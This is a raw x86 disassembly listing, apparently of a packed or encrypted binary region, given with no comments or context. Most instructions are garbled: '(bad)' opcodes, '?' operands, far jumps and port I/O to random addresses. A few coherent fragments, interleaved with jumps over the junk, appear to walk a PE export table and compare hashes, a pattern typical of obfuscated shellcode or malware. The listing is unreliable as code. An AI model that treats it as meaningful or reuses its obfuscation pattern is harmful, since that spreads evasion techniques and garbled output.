  40ec8e:	lds    esi,FWORD PTR [edi]
  40ec90:	retf   
  40ec91:	cmp    esi,DWORD PTR [eax+ecx*2]
  40ec94:	clc    
  40ec95:	call   0xbc919d29
  40ec9a:	push   ds
  40ec9b:	or     eax,DWORD PTR [eax-0x3b43f660]
  40eca1:	xor    bl,BYTE PTR ds:0x9a4fa7a1
  40eca7:	mov    al,ds:0x3017ad4b
  40ecac:	mov    ch,0xde
  40ecae:	sub    ebx,DWORD PTR [esi-0x2f9f08b4]
  40ecb4:	mov    dh,ah
  40ecb6:	push   eax
  40ecb7:	jmp    0x40ed0b
  40ecb9:	xlat   BYTE PTR ds:[ebx]
  40ecba:	fisttp DWORD PTR [edx+0x29b4548d]
  40ecc0:	push   ebx
  40ecc1:	jne    0x40ed00
  40ecc3:	jmp    0xfb0ad4e0
  40ecc8:	ins    BYTE PTR es:[edi],dx
  40ecc9:	addr16 and al,0x3f
  40eccc:	dec    edi
  40eccd:	bound  edx,QWORD PTR [eax+0x6b]
  40ecd0:	cmp    eax,0xa395738d
  40ecd5:	xchg   esp,eax
  40ecd6:	cwde   
  40ecd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecd8:	fistp  DWORD PTR [esi-0x15737512]
  40ecde:	pop    esi
  40ecdf:	lods   al,BYTE PTR ds:[esi]
  40ece0:	hlt    
  40ece1:	xor    eax,0x893a7665
  40ece6:	inc    ebp
  40ece7:	in     al,dx
  40ece8:	mov    eax,DWORD PTR [ebp-0x4]
  40eceb:	mov    ecx,DWORD PTR [ebp-0x14]
  40ecee:	xor    eax,esi
  40ecf0:	add    eax,ebx
  40ecf2:	cmp    ecx,eax
  40ecf4:	je     0x40fd3a
  40ecfa:	mov    eax,DWORD PTR [ebp-0x14]
  40ecfd:	mov    eax,DWORD PTR [eax+0x18]
  40ed00:	mov    DWORD PTR [ebp-0x20],eax
  40ed03:	mov    eax,DWORD PTR [ebp-0x14]
  40ed06:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed09:	add    ecx,DWORD PTR [eax+0x20]
  40ed0c:	mov    DWORD PTR [ebp-0x28],ecx
  40ed0f:	mov    eax,DWORD PTR [ebp-0x14]
  40ed12:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed15:	jmp    0x40f109
  40ed1a:	loopne 0x40ece4
  40ed1c:	or     ebx,DWORD PTR [edx]
  40ed1e:	xor    esp,ecx
  40ed20:	in     eax,dx
  40ed21:	ror    BYTE PTR [esi],cl
  40ed23:	cmp    DWORD PTR [ebx+0x4d812277],eax
  40ed29:	aad    0x4
  40ed2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed2c:	jo     0x40ed9e
  40ed2e:	dec    ecx
  40ed2f:	jge    0x40eda1
  40ed31:	jo     0x40ed7f
  40ed33:	test   eax,0x44007483
  40ed38:	(bad)  
  40ed39:	outs   dx,BYTE PTR ds:[esi]
  40ed3a:	sub    eax,0x8b5100bb
  40ed3f:	inc    ebp
  40ed40:	and    dl,BYTE PTR [ebx-0x76]
  40ed43:	mov    bl,0xb9
  40ed45:	out    0xf3,al
  40ed47:	jmp    0x993f5b1c
  40ed4c:	mov    esi,0xf84cd7e6
  40ed51:	fwait
  40ed52:	sbb    DWORD PTR ds:0x1d589cec,ebp
  40ed58:	lock lea edx,es:[ebx-0xc]
  40ed5d:	mov    edi,0xeca106f4
  40ed62:	add    ah,BYTE PTR [ebp-0x35]
  40ed65:	jg     0x40ed51
  40ed67:	cmc    
  40ed68:	jae    0x40edbe
  40ed6a:	and    al,0xfa
  40ed6c:	in     al,0x76
  40ed6e:	push   ds
  40ed6f:	(bad)  
  40ed70:	xchg   esp,eax
  40ed71:	adc    eax,0x619597ea
  40ed76:	div    DWORD PTR fs:[ebx-0x4c]
  40ed7a:	popf   
  40ed7b:	aas    
  40ed7c:	bound  esp,QWORD PTR [esi+0x77b83f91]
  40ed82:	adc    BYTE PTR [ebp+0x79c3ab9],bh
  40ed88:	sbb    al,BYTE PTR [eax+0x71922d5b]
  40ed8e:	inc    ebp
  40ed8f:	hlt    
  40ed90:	lods   eax,DWORD PTR ds:[esi]
  40ed91:	push   cs
  40ed92:	jnp    0x40eddc
  40ed94:	stos   DWORD PTR es:[edi],eax
  40ed95:	aad    0x5b
  40ed97:	inc    ebp
  40ed98:	mov    DWORD PTR [ebp+0x773f6bcb],ebp
  40ed9e:	mov    dh,0x22
  40eda0:	push   edi
  40eda1:	mov    ds:0x9be071ae,eax
  40eda6:	push   ebp
  40eda7:	mov    ecx,0x3e6e5be
  40edac:	ins    BYTE PTR es:[edi],dx
  40edad:	lods   al,BYTE PTR ds:[esi]
  40edae:	cli    
  40edaf:	add    eax,0xe27232d9
  40edb4:	push   ecx
  40edb5:	xor    eax,0xae235232
  40edba:	jmp    0x2d2fff2c
  40edbf:	add    al,0x5f
  40edc1:	cld    
  40edc2:	shl    BYTE PTR [ebx+0xa71812b],0x41
  40edc9:	add    dl,BYTE PTR [edi]
  40edcb:	add    DWORD PTR [edx+0x7e],edx
  40edce:	and    ah,bl
  40edd0:	leave  
  40edd1:	jle    0x40eddb
  40edd3:	sar    edi,cl
  40edd5:	adc    eax,0x1da9fc35
  40edda:	push   0x55
  40eddc:	fidiv  DWORD PTR gs:[edx+ebp*4]
  40ede0:	outs   dx,DWORD PTR ds:[esi]
  40ede1:	rcr    BYTE PTR [edi-0x6e],0x7
  40ede5:	adc    BYTE PTR [edx+0x6c8a0286],bh
  40edeb:	cwde   
  40edec:	stos   BYTE PTR es:[edi],al
  40eded:	sub    bh,bl
  40edef:	out    dx,al
  40edf0:	or     al,0x37
  40edf2:	cmc    
  40edf3:	inc    esp
  40edf4:	pop    es
  40edf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edf6:	and    BYTE PTR [ebp+0x50],0xa7
  40edfa:	lea    ebp,[edx]
  40edfc:	push   0xffffffa5
  40edfe:	dec    esp
  40edff:	ret    
  40ee00:	add    cl,BYTE PTR [ebx+0x23]
  40ee03:	jp     0x40ee6c
  40ee05:	(bad)  
  40ee06:	test   BYTE PTR [edx],dh
  40ee08:	mov    DWORD PTR [ebp-0x4c],ebp
  40ee0b:	lods   eax,DWORD PTR ds:[esi]
  40ee0c:	cmp    edi,esp
  40ee0e:	inc    edi
  40ee0f:	mov    eax,ds:0x9240ad44
  40ee14:	pop    ds
  40ee15:	inc    esp
  40ee16:	or     al,0x28
  40ee18:	sbb    dh,dh
  40ee1a:	outs   dx,DWORD PTR ds:[esi]
  40ee1b:	mov    ch,0x5b
  40ee1d:	enter  0x5a61,0x4e
  40ee21:	xchg   edx,eax
  40ee22:	sub    esi,DWORD PTR [ecx-0x77]
  40ee25:	dec    esp
  40ee26:	js     0x40ee1d
  40ee28:	shl    DWORD PTR fs:[ecx-0x4fae6587],0x3b
  40ee30:	sub    BYTE PTR [eax],dh
  40ee32:	pop    ss
  40ee33:	arpl   WORD PTR [ebx+eax*4+0x5a],sp
  40ee37:	xchg   ecx,eax
  40ee38:	push   esi
  40ee39:	pop    ds
  40ee3a:	pop    ebx
  40ee3b:	sahf   
  40ee3c:	loopne 0x40ee54
  40ee3e:	jge    0x40eddb
  40ee40:	mov    dh,0x6d
  40ee42:	dec    eax
  40ee43:	stc    
  40ee44:	mov    BYTE PTR [edx],0xb6
  40ee47:	inc    ecx
  40ee48:	ja     0x40ee27
  40ee4a:	adc    eax,0xeb6993fd
  40ee4f:	(bad)  
  40ee50:	hlt    
  40ee51:	scas   al,BYTE PTR es:[edi]
  40ee52:	mov    ?,WORD PTR [edi+0x7b]
  40ee55:	dec    ecx
  40ee56:	dec    edi
  40ee57:	fisubr WORD PTR [ecx+0x48d271b]
  40ee5d:	arpl   WORD PTR [eax],bp
  40ee5f:	jecxz  0x40eedc
  40ee61:	add    BYTE PTR [edx-0x1aa3db54],ch
  40ee67:	cmp    al,0x1
  40ee69:	jecxz  0x40ee4f
  40ee6b:	cmp    eax,0x73dccb51
  40ee70:	fucom  st(0)
  40ee72:	adc    al,0xb4
  40ee74:	sbb    eax,0x4c0c7342
  40ee79:	pop    ds
  40ee7a:	jmp    0x40ee14
  40ee7c:	mov    edi,DWORD PTR [edi-0x16]
  40ee7f:	data16 (bad) 
  40ee81:	fmul   DWORD PTR [edx]
  40ee83:	imul   esp,ebp,0xfffffff3
  40ee86:	repnz fimul DWORD PTR [ebx+0x26]
  40ee8a:	pusha  
  40ee8b:	add    eax,0x39a930c4
  40ee90:	out    0x66,eax
  40ee92:	jle    0x40eeca
  40ee94:	ins    DWORD PTR es:[edi],dx
  40ee95:	sar    DWORD PTR [ecx-0x31ff6236],cl
  40ee9b:	sub    ebp,DWORD PTR [edx-0xa]
  40ee9e:	inc    esi
  40ee9f:	pandn  mm5,mm6
  40eea2:	mov    ds:0xb924ab29,al
  40eea7:	shl    BYTE PTR [edx],0xc1
  40eeaa:	jb     0x40eead
  40eeac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eead:	imul   edx,esi,0x37841f9b
  40eeb3:	xchg   ebx,eax
  40eeb4:	inc    ecx
  40eeb5:	push   ecx
  40eeb6:	lahf   
  40eeb7:	(bad)  
  40eeb8:	mov    bh,0xbe
  40eeba:	and    BYTE PTR [ebx-0xb],cl
  40eebd:	and    DWORD PTR [esi],esi
  40eebf:	inc    edx
  40eec0:	adc    DWORD PTR [ecx+0x50d3c811],eax
  40eec6:	and    edx,0x497417e8
  40eecc:	and    ecx,DWORD PTR [ecx+esi*8+0x28]
  40eed0:	push   cs
  40eed1:	jb     0x40eef1
  40eed3:	fs jnp 0x40ee9b
  40eed6:	sbb    DWORD PTR [ecx-0x32],esp
  40eed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eedb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eedc:	pop    esp
  40eedd:	mov    ?,WORD PTR [ebx+0x14]
  40eee0:	rol    BYTE PTR [edi],1
  40eee2:	inc    ebx
  40eee3:	cmc    
  40eee4:	dec    esi
  40eee5:	jb     0x40ee68
  40eee7:	call   0xa0dfe97e
  40eeec:	jecxz  0x40eecb
  40eeee:	cmp    al,BYTE PTR [edx-0x28]
  40eef1:	adc    ecx,DWORD PTR [ebx-0x681a3ab8]
  40eef7:	lahf   
  40eef8:	cmp    al,0x9
  40eefa:	mov    edx,0x3ac62df4
  40eeff:	ret    
  40ef00:	rcl    BYTE PTR [ebx-0x7ad8615],0x4d
  40ef07:	aam    0x29
  40ef09:	icebp  
  40ef0a:	jecxz  0x40ee92
  40ef0c:	sub    dh,cl
  40ef0e:	inc    ebp
  40ef0f:	push   cs
  40ef10:	inc    ebx
  40ef11:	out    dx,eax
  40ef12:	mov    ebx,0x83a75272
  40ef17:	in     al,0x66
  40ef19:	(bad)  
  40ef1b:	sub    eax,0x4026b5ea
  40ef20:	and    eax,DWORD PTR [edi]
  40ef22:	inc    ecx
  40ef23:	test   DWORD PTR [ebx+0x5252655d],0xaa713e61
  40ef2d:	adc    BYTE PTR [esi+0x2a7efed5],ch
  40ef33:	mov    edx,edx
  40ef35:	bound  eax,QWORD PTR [ebp+0x12]
  40ef38:	inc    ecx
  40ef39:	sbb    al,0x7d
  40ef3b:	add    ch,BYTE PTR [ecx+0x9fdb8d1]
  40ef41:	push   0xffffffb9
  40ef43:	sub    al,0x9d
  40ef45:	xor    DWORD PTR [ecx],edx
  40ef47:	adc    al,dh
  40ef49:	add    dh,BYTE PTR [eax]
  40ef4b:	mov    bl,0x1
  40ef4d:	pushf  
  40ef4e:	call   0xd109:0xfe5adf31
  40ef55:	push   esi
  40ef56:	aaa    
  40ef57:	scas   eax,DWORD PTR es:[edi]
  40ef58:	mov    edi,0x67532c9
  40ef5e:	and    eax,0xa9d50040
  40ef63:	mov    ecx,0xa7293172
  40ef68:	fsub   DWORD PTR [eax]
  40ef6a:	rcl    DWORD PTR [ecx-0x66],1
  40ef6d:	pop    DWORD PTR [edi]
  40ef6f:	jg     0x40efc5
  40ef71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef72:	adc    ch,bl
  40ef74:	pop    es
  40ef75:	leave  
  40ef76:	rcl    edi,1
  40ef78:	jmp    0x596e8e56
  40ef7d:	in     eax,0x97
  40ef7f:	out    0x8a,eax
  40ef81:	ja     0x40efb3
  40ef83:	sub    dl,BYTE PTR [eax-0x61]
  40ef86:	fcomp  st(4)
  40ef88:	xchg   esi,eax
  40ef89:	fsub   st,st(7)
  40ef8b:	mov    eax,0x9c7f0d0d
  40ef90:	mov    eax,ds:0x3858c87d
  40ef95:	scas   eax,DWORD PTR es:[edi]
  40ef96:	sar    BYTE PTR [ecx+0x59],0xea
  40ef9a:	ds inc ebx
  40ef9c:	cmp    BYTE PTR [esp+ebx*2],cl
  40ef9f:	push   esp
  40efa0:	loope  0x40ef9f
  40efa2:	dec    edx
  40efa3:	push   esi
  40efa4:	cmp    ebp,DWORD PTR [esi+0x76]
  40efa7:	jo     0x40efcc
  40efa9:	sbb    al,0x17
  40efab:	xor    al,0x8b
  40efad:	pop    es
  40efae:	add    DWORD PTR [ecx+ebp*4],eax
  40efb1:	xchg   ebp,eax
  40efb2:	push   esp
  40efb3:	pop    ebx
  40efb4:	ss mov al,0x71
  40efb7:	jp     0x40ef3d
  40efb9:	ds or  bh,ah
  40efbc:	(bad)  
  40efbe:	fcmovne st,st(2)
  40efc0:	aam    0x5f
  40efc2:	repz xor dh,BYTE PTR ds:[ebx+0x16]
  40efc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efc8:	and    BYTE PTR [ebx+0x71],dl
  40efcb:	sbb    ecx,DWORD PTR [edi]
  40efcd:	push   es
  40efce:	pop    es
  40efcf:	adc    BYTE PTR ds:0xd193c72e,ah
  40efd5:	scas   eax,DWORD PTR es:[edi]
  40efd6:	jecxz  0x40f036
  40efd8:	aam    0xc9
  40efda:	mov    DWORD PTR [eax+edx*2+0x64],esi
  40efde:	push   edi
  40efdf:	scas   al,BYTE PTR es:[edi]
  40efe0:	sti    
  40efe1:	xor    edi,DWORD PTR fs:[edx]
  40efe4:	dec    ecx
  40efe5:	sub    BYTE PTR [ecx-0x27],dh
  40efe8:	mov    esi,0x9cb308ec
  40efed:	enter  0x68f1,0xec
  40eff1:	jae    0x40efc1
  40eff3:	js     0x40f007
  40eff5:	mov    esi,DWORD PTR [edx+0x1d]
  40eff8:	outs   dx,DWORD PTR ds:[esi]
  40eff9:	cld    
  40effa:	loop   0x40f052
  40effc:	jnp    0x40f06e
  40effe:	jle    0x40f031
  40f000:	fsincos 
  40f002:	cmp    BYTE PTR [ebx],0x17
  40f005:	stc    
  40f006:	call   0x48d0:0xa8db916a
  40f00d:	popa   
  40f00e:	stos   DWORD PTR es:[edi],eax
  40f00f:	dec    ebp
  40f010:	cdq    
  40f011:	inc    esp
  40f012:	adc    al,0xba
  40f014:	inc    eax
  40f015:	xor    al,0x36
  40f017:	push   esi
  40f018:	jp     0x40f00b
  40f01a:	push   ebx
  40f01b:	aad    0xfd
  40f01d:	outs   dx,DWORD PTR ds:[esi]
  40f01e:	cmp    BYTE PTR [ecx],cl
  40f020:	ins    DWORD PTR es:[edi],dx
  40f021:	dec    ebx
  40f022:	jecxz  0x40efdc
  40f024:	je     0x40f028
  40f026:	inc    esi
  40f027:	adc    BYTE PTR [edi],bh
  40f029:	or     eax,DWORD PTR [ecx+ebx*4]
  40f02c:	imul   ebx,eax,0x1b
  40f02f:	push   ebp
  40f030:	retf   
  40f031:	pusha  
  40f032:	clc    
  40f033:	xor    eax,0xcf8ade46
  40f038:	dec    ebx
  40f039:	and    dl,bl
  40f03b:	mov    ecx,0x6bc98583
  40f040:	mov    al,ds:0x328415df
  40f045:	les    ebp,FWORD PTR [ebp-0x5cb0359c]
  40f04b:	mov    WORD PTR [edx+eax*4],ds
  40f04e:	aaa    
  40f04f:	test   DWORD PTR [ebx+eiz*4+0x76f218b7],0x4bf897d8
  40f05a:	xchg   edi,eax
  40f05b:	iret   
  40f05c:	xchg   edi,eax
  40f05d:	test   eax,0xb58ef101
  40f062:	mov    bh,0x61
  40f064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f065:	call   0x9aaa:0x4ae1b0e8
  40f06c:	std    
  40f06d:	imul   esp,DWORD PTR [eax+esi*1],0xe2769845
  40f074:	dec    ebp
  40f075:	mov    ds:0x267d75a4,al
  40f07a:	popf   
  40f07b:	and    BYTE PTR [esi],dl
  40f07d:	sub    DWORD PTR [edx+edi*4+0x3e],ecx
  40f081:	xchg   edi,eax
  40f082:	je     0x40f0f1
  40f084:	mov    ds:0xc46a6144,eax
  40f089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f08a:	ins    DWORD PTR es:[edi],dx
  40f08b:	(bad)  
  40f08c:	jns    0x40f0ed
  40f08e:	lock (bad) 
  40f090:	int3   
  40f091:	and    DWORD PTR [edi+0x4d],edx
  40f094:	adc    al,0x36
  40f096:	add    ah,BYTE PTR [ebp-0x5d1d7311]
  40f09c:	jo     0x40f093
  40f09e:	mov    bh,BYTE PTR [edx+0x3b]
  40f0a1:	div    BYTE PTR [esi+0x36]
  40f0a4:	out    dx,al
  40f0a5:	js     0x40f08c
  40f0a7:	jnp    0x40f03d
  40f0a9:	or     eax,0x7a19908c
  40f0ae:	xchg   ebx,eax
  40f0af:	pushf  
  40f0b0:	mov    bl,0xb7
  40f0b2:	lock xchg ebx,eax
  40f0b4:	push   edx
  40f0b5:	xor    al,BYTE PTR [ebx-0x3c8c3ad9]
  40f0bb:	inc    esp
  40f0bc:	fnsave [eax-0x29434842]
  40f0c2:	jmp    0x40f053
  40f0c4:	ss or  eax,0x1d431f66
  40f0ca:	or     DWORD PTR [ebp+esi*8-0x19],ecx
  40f0ce:	cmp    dl,BYTE PTR [ebx]
  40f0d0:	push   ss
  40f0d1:	stos   BYTE PTR es:[edi],al
  40f0d2:	add    eax,0xdb4517cf
  40f0d7:	cmc    
  40f0d8:	mov    ch,0xa8
  40f0da:	in     al,0x36
  40f0dc:	call   0x6d19f097
  40f0e1:	popf   
  40f0e2:	xchg   edx,eax
  40f0e3:	repnz mov edi,0x322946b0
  40f0e9:	cmpps  xmm6,XMMWORD PTR [edx+0x7e],0x12
  40f0ee:	cmc    
  40f0ef:	test   DWORD PTR [ecx],ebx
  40f0f1:	push   es
  40f0f2:	and    esp,DWORD PTR [eax-0x16]
  40f0f5:	add    eax,0xc24d0975
  40f0fa:	rcr    DWORD PTR [ebp-0x35cd35c7],1
  40f100:	test   BYTE PTR [edx-0x76bc3d7d],ah
  40f106:	adc    bl,dl
  40f108:	add    DWORD PTR [ebx],eax
  40f10a:	dec    eax
  40f10b:	and    al,0x89
  40f10d:	dec    ebp
  40f10e:	aam    0x8b
  40f110:	inc    ebp
  40f111:	in     al,dx
  40f112:	mov    ecx,DWORD PTR [ebp+0x8]
  40f115:	add    ecx,DWORD PTR [eax+0x1c]
  40f118:	jmp    0x40f50c
  40f11d:	inc    ecx
  40f11e:	jae    0x40f19a
  40f120:	pop    ebp
  40f121:	sub    dh,BYTE PTR [ebp+0x61]
  40f124:	jae    0x40f173
  40f126:	and    ebp,DWORD PTR [eax]
  40f128:	mov    bh,0x57
  40f12a:	enter  0x2803,0x5d
  40f12e:	mov    ds:0x7d497070,eax
  40f133:	jo     0x40f1a5
  40f135:	xlat   BYTE PTR ds:[ebx]
  40f136:	out    0x82,al
  40f138:	aas    
  40f139:	jo     0x40f15e
  40f13b:	clc    
  40f13c:	push   0x24be509
  40f141:	adc    al,0x1f
  40f143:	cmp    eax,0xad6b74e1
  40f148:	popa   
  40f149:	mov    cl,0x3b
  40f14b:	and    edi,DWORD PTR [eax-0x680cee7f]
  40f151:	fnstsw WORD PTR ds:0x13e16095
  40f157:	hlt    
  40f158:	or     al,0xf4
  40f15a:	div    DWORD PTR cs:[esi-0x72]
  40f15e:	data16 adc ch,BYTE PTR [edi+0x22681aee]
  40f165:	mov    esi,0x2035195e
  40f16a:	mov    ds:0x391169b2,eax
  40f16f:	mov    eax,0x737fd26
  40f174:	pop    ebp
  40f175:	out    0x4d,eax
  40f177:	scas   al,BYTE PTR es:[edi]
  40f178:	xchg   ebp,eax
  40f179:	jbe    0x40f1ab
  40f17b:	mov    ebx,0xbd3b4383
  40f180:	add    ebx,DWORD PTR [esp+eiz*2-0x29]
  40f184:	aaa    
  40f185:	or     eax,0xf89d3a8c
  40f18a:	pusha  
  40f18b:	nop
  40f18c:	pop    edi
  40f18d:	sahf   
  40f18e:	mov    bl,0x78
  40f190:	mov    ds:0xfdc21a28,eax
  40f195:	push   edx
  40f196:	add    BYTE PTR [edx*8+0x57f09094],al
  40f19d:	adc    eax,0x99a71799
  40f1a2:	pop    edx
  40f1a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1a4:	in     al,dx
  40f1a5:	sub    bh,al
  40f1a7:	rcl    DWORD PTR [edx-0x41],cl
  40f1aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1ab:	adc    al,0xb4
  40f1ad:	xor    bl,BYTE PTR [ebp-0x3]
  40f1b0:	fld    DWORD PTR [edi]
  40f1b2:	ret    0x4059
  40f1b5:	xor    BYTE PTR [edx+0x6a6eb2cf],0xa5
  40f1bc:	div    eax
  40f1be:	xchg   edx,eax
  40f1bf:	ret    0x7b85
  40f1c2:	add    BYTE PTR [ebx-0x7e0f0843],ah
  40f1c8:	mov    ecx,0x2547e2a5
  40f1cd:	sbb    eax,0x61aad4bf
  40f1d2:	and    ecx,DWORD PTR [ecx+ebp*1+0x598fa72c]
  40f1d9:	xor    al,0x60
  40f1db:	inc    edi
  40f1dc:	mov    ecx,edi
  40f1de:	data16 test al,0x9d
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	pop    edi
  40f1e3:	cs jl  0x40f16b
  40f1e6:	in     eax,0xb2
  40f1e8:	hlt    
  40f1e9:	jmp    0xadcc7f0b
  40f1ee:	pop    ecx
  40f1ef:	std    
  40f1f0:	sub    eax,0xb62f9ed9
  40f1f5:	xor    al,0x45
  40f1f7:	ins    BYTE PTR es:[edi],dx
  40f1f8:	ja     0x40f1c6
  40f1fa:	daa    
  40f1fb:	loopne 0x40f19c
  40f1fd:	daa    
  40f1fe:	xchg   ebx,eax
  40f1ff:	scas   al,BYTE PTR es:[edi]
  40f200:	dec    ebx
  40f201:	mov    ds:0x2983dc8,al
  40f206:	dec    edi
  40f207:	xor    eax,0x6cc52fdd
  40f20c:	and    bh,BYTE PTR [esi+0x778d155f]
  40f212:	dec    esi
  40f213:	test   BYTE PTR [ecx+0x292558dc],al
  40f219:	sub    dl,ch
  40f21b:	mov    ?,WORD PTR [eax+0x1f]
  40f21e:	xchg   ebp,eax
  40f21f:	dec    ebp
  40f220:	enter  0x2ab1,0xa4
  40f224:	icebp  
  40f225:	sub    al,0x40
  40f227:	in     al,dx
  40f228:	adc    cl,al
  40f22a:	jmp    0x1655:0xe5bf0d67
  40f231:	daa    
  40f232:	mov    edx,0xed4ae299
  40f237:	sub    al,0x21
  40f239:	dec    eax
  40f23a:	lds    edx,FWORD PTR [esi]
  40f23c:	or     DWORD PTR [edi+0x47],ebp
  40f23f:	xchg   edi,eax
  40f240:	dec    ebp
  40f241:	mov    ds:0xd2c03e97,eax
  40f246:	jbe    0x40f2ad
  40f248:	jns    0x40f21b
  40f24a:	inc    esp
  40f24b:	leave  
  40f24c:	(bad)  
  40f24d:	jg     0x40f248
  40f24f:	daa    
  40f250:	or     al,0x37
  40f252:	fnstsw WORD PTR [eax+edx*8]
  40f255:	mov    ebx,DWORD PTR [edi]
  40f257:	jge    0x40f29b
  40f259:	arpl   bx,si
  40f25b:	jo     0x40f265
  40f25d:	shl    DWORD PTR [esi-0x363b3117],0x77
  40f264:	ret    
  40f265:	fsubrp st(5),st
  40f267:	and    al,0xb9
  40f269:	call   0x37127abd
  40f26e:	mov    ?,WORD PTR [ebx+0x47]
  40f271:	and    ebx,DWORD PTR [ebp-0x6e]
  40f274:	es aad 0xdb
  40f277:	pop    edx
  40f278:	xchg   ebx,eax
  40f279:	mov    esp,0x3cac9beb
  40f27e:	mov    cl,0xd1
  40f280:	inc    ebp
  40f281:	mov    esi,0x6c76866f
  40f286:	js     0x40f2b8
  40f288:	clc    
  40f289:	in     eax,dx
  40f28a:	iret   
  40f28b:	mov    eax,0x466f6c3f
  40f290:	xchg   ebx,eax
  40f291:	add    al,0x90
  40f293:	xor    eax,0x13572080
  40f298:	cwde   
  40f299:	mov    dh,0xb5
  40f29b:	mov    ch,0x67
  40f29d:	scas   eax,DWORD PTR es:[edi]
  40f29e:	xchg   edx,eax
  40f29f:	icebp  
  40f2a0:	xchg   DWORD PTR [edx+0x3f772802],ebp
  40f2a6:	xchg   esi,eax
  40f2a7:	loopne 0x40f313
  40f2a9:	xor    al,BYTE PTR [ecx+0x1a6dfad4]
  40f2af:	mov    bl,BYTE PTR [edi]
  40f2b1:	mov    al,ds:0xd939c377
  40f2b6:	push   ds
  40f2b7:	aaa    
  40f2b8:	mov    al,ds:0x85812651
  40f2bd:	push   edi
  40f2be:	rcl    DWORD PTR [ebx-0x26],cl
  40f2c1:	lea    edx,[ebx]
  40f2c3:	call   0x5214cf80
  40f2c8:	push   esi
  40f2c9:	mov    ?,ecx
  40f2cb:	aaa    
  40f2cc:	xor    eax,0xf1ac6f69
  40f2d1:	cwde   
  40f2d2:	(bad)  
  40f2d3:	xor    eax,0xd04e7c3c
  40f2d8:	pop    edi
  40f2d9:	push   0xfffffffa
  40f2db:	xchg   esi,eax
  40f2dc:	or     BYTE PTR [ecx+0x54],ch
  40f2df:	dec    eax
  40f2e0:	mov    esi,0xfc175154
  40f2e5:	pushf  
  40f2e6:	push   edx
  40f2e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2e8:	xor    DWORD PTR [eax-0x1f],ebx
  40f2eb:	pop    ss
  40f2ec:	pop    eax
  40f2ed:	rcr    BYTE PTR [ebx-0x1a],1
  40f2f0:	jge    0x40f272
  40f2f2:	xor    al,0x76
  40f2f4:	fwait
  40f2f5:	mov    ebp,0x8c192ade
  40f2fa:	mov    ebp,0x1342af87
  40f2ff:	mov    ch,0x56
  40f301:	jae    0x40f324
  40f303:	jns    0x40f356
  40f305:	pop    DWORD PTR [esi-0xa7abbc6]
  40f30b:	test   al,0xad
  40f30d:	into   
  40f30e:	push   eax
  40f30f:	jecxz  0x40f34a
  40f311:	jne    0x40f2f5
  40f313:	and    ah,BYTE PTR [ebx-0x58]
  40f316:	daa    
  40f317:	and    cl,dh
  40f319:	push   cs
  40f31a:	inc    ecx
  40f31b:	aaa    
  40f31c:	xor    edx,DWORD PTR [ebx-0x23ff25b8]
  40f322:	jecxz  0x40f396
  40f324:	xor    al,0x25
  40f326:	jle    0x40f2d0
  40f328:	push   ss
  40f329:	mov    ds:0xa85c44cb,al
  40f32e:	int    0xea
  40f330:	imul   eax,DWORD PTR [eax],0x69
  40f333:	push   0x3e
  40f335:	xchg   edi,eax
  40f336:	xor    bl,BYTE PTR [eax+0x65bb1bfb]
  40f33c:	inc    ebp
  40f33d:	adc    BYTE PTR [edx+0x1ad8d54],0x48
  40f344:	mov    ebx,0xe84e7044
  40f349:	shl    BYTE PTR [esi-0xe],cl
  40f34c:	mov    fs,WORD PTR [ebp+0x72]
  40f34f:	pop    edi
  40f350:	sbb    ebp,DWORD PTR [edx+0x46]
  40f353:	loope  0x40f3bb
  40f355:	jmp    0x1e78:0x2a4646fa
  40f35c:	sub    DWORD PTR [esi+0x76],ecx
  40f35f:	sbb    ecx,DWORD PTR [ebp+0x667211d9]
  40f365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f366:	fild   QWORD PTR [ebp-0x68]
  40f369:	sar    BYTE PTR [ebp-0x31],cl
  40f36c:	rcl    DWORD PTR [ebx-0x2afa4b42],cl
  40f372:	or     eax,0x8e8b99ba
  40f377:	and    eax,0x74e1b5e
  40f37c:	jp     0x40f3e2
  40f37e:	jg     0x40f3af
  40f380:	retf   0x577b
  40f383:	fwait
  40f384:	and    ah,dh
  40f386:	or     edi,ebx
  40f388:	jbe    0x40f397
  40f38a:	imul   edi,ebx,0x64
  40f38d:	xchg   edi,eax
  40f38e:	ret    
  40f38f:	push   cs
  40f390:	sub    DWORD PTR [edi-0xd20cd98],0xdfa4920b
  40f39a:	mov    ds:0xa91704db,eax
  40f39f:	das    
  40f3a0:	arpl   WORD PTR [edi],si
  40f3a2:	bound  esp,QWORD PTR [edx]
  40f3a4:	fcomi  st,st(1)
  40f3a6:	jmp    0x40f335
  40f3a8:	mov    edi,0x753d562f
  40f3ad:	sub    edi,eax
  40f3af:	call   DWORD PTR fs:[ebx+ecx*4]
  40f3b3:	mov    bh,0x39
  40f3b5:	fcom   DWORD PTR [eax-0x74]
  40f3b8:	pop    es
  40f3b9:	jne    0x40f35f
  40f3bb:	mov    cl,0x38
  40f3bd:	call   FWORD PTR [esi-0x67833bca]
  40f3c3:	xchg   ecx,eax
  40f3c4:	adc    ebp,DWORD PTR [edi+0x3]
  40f3c7:	xchg   BYTE PTR [eax-0x392c649a],ah
  40f3cd:	mov    ds,WORD PTR [ecx+0x31]
  40f3d0:	xchg   BYTE PTR [ebx-0x61b3b7b2],ah
  40f3d6:	dec    edx
  40f3d7:	inc    edx
  40f3d8:	dec    edi
  40f3d9:	(bad)  
  40f3da:	mov    ds:0x13e62bb4,al
  40f3df:	mov    edx,0x41d64a92
  40f3e4:	out    0xa8,al
  40f3e6:	out    0xc3,al
